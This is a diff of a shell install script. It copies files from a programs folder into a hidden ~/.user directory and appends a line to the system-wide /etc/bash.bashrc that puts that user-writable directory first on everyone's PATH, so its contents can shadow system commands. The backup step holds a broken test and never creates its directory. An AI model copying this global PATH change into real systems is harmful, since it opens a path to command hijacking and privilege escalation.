@@ -1,14 +1,51 @@
-#!/bin/bash
+#!/bin/sh
+secret=~/.user
+backup=~/.backup
+
+if [ -e "$backup" ] 
+then
+    echo "$backup exists"
+else
+    if [ mkdir "$backup" ] 2> /dev/null
+    then 
+        echo "made backup dir"
+    fi
+fi
+
+# copy over bashrc
+sudo cp /etc/bash.bashrc $backup/bash.bashrc
+
+# make sure
+if [ $? -eq 0 ]; then
+    echo "Backup ready"
+else
+    echo "Backup could not be made. Exiting"
+    exit 1
+fi
+
 
 # directory for all the magic
-mkdir ~/.user
+if [ -e "$secret" ] 
+then
+    echo "dir exists"
+else
+    mkdir "$secret" 
+    if [ $? -eq 0 ]
+    then 
+        echo "made secret dir"
+    fi
+fi
 
 # Making the required files
-for file in *.program
+cd programs/
+for file in *
 do
-    chmod +x $file
-    ./$file
+    chmod +x "$file"
+
+    echo "copying $file to $secret"
+    cp ./"$file" "$secret"/"$file"
 done
 
 # Add folder to path
-echo "PATH=~/.user/:$PATH" >> /etc/bash.bashrc
+echo "PATH=$secret:$PATH" >> /etc/bash.bashrc
+
